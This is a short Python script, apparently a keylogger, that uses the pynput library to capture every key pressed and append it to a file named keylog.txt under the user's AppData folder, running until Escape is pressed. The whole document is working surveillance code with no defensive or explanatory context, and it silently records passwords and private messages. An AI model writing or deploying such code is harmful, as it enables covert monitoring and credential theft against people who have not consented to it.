```python

import os
import sys
import time
from pynput import keyboard

# File to write keystrokes
file = os.path.join(os.path.expanduser('~'), 'AppData', 'keylog.txt')

def on_press(key):
    try:
        k = key.char
    except:
        k = str(key)
    with open(file, 'a') as f:
        f.write(k)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```